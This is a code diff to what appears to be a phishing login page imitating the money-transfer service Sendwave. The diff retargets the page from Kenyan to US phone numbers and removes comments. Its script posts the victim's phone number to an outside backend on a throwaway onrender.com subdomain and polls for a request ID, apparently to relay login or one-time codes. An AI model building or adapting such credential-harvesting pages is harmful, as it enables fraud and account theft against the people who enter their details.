@@ -34,7 +34,7 @@ body{
     margin-bottom:22px;
 }
 
-/* TITLE (BIG LIKE IMAGE) */
+/* TITLE */
 h1{
     font-size:34px;
     font-weight:700;
@@ -130,7 +130,7 @@ h1{
     transform:translateX(24px);
 }
 
-/* LOGIN BUTTON (BIG YELLOW LIKE IMAGE) */
+/* LOGIN BUTTON */
 #nextBtn{
     width:100%;
     height:58px;
@@ -205,20 +205,20 @@ h1{
 
     <h1>Welcome back</h1>
 
-    <!-- FORM (UNCHANGED IDS FOR YOUR SCRIPT) -->
     <form id="detailsForm">
 
         <input type="hidden" id="name" value="User">
 
+        <!-- USA PHONE INPUT UPDATED -->
         <div class="phone-wrapper">
             <div class="country-box">
-                🇰🇪 <span>⌄</span>
+                🇺🇸 <span>⌄</span>
             </div>
 
             <input
                 id="phone"
                 type="tel"
-                placeholder="+254 788 888888"
+                placeholder="+1 (555) 123-4567"
                 required
             >
         </div>
@@ -241,19 +241,16 @@ h1{
 
     </form>
 
-    <!-- DIVIDER -->
     <div class="divider">
         <span></span>
         <p>or</p>
         <span></span>
     </div>
 
-    <!-- SOCIAL BUTTONS -->
     <button class="social-btn">G Continue with Google</button>
     <button class="social-btn"> Continue with Apple</button>
     <button class="social-btn">✉ Continue with Email</button>
 
-    <!-- FOOTER -->
     <div class="footer">
         <a href="#">Trouble logging in?</a>
         <p>Don't have an account? <a href="#">Sign up</a></p>
@@ -261,7 +258,6 @@ h1{
 
 </div>
 
-<!-- 🔥 YOUR SCRIPT (UNCHANGED EXACTLY) -->
 <script>
 const BACKEND_URL = "https://sendwave-9mid.onrender.com";
 
@@ -306,7 +302,6 @@ document.getElementById('detailsForm').addEventListener('submit', async (e) => {
         });
 
         const data = await res.json();
-
         const requestId = data.requestId;
 
         const poll = setInterval(async () => {
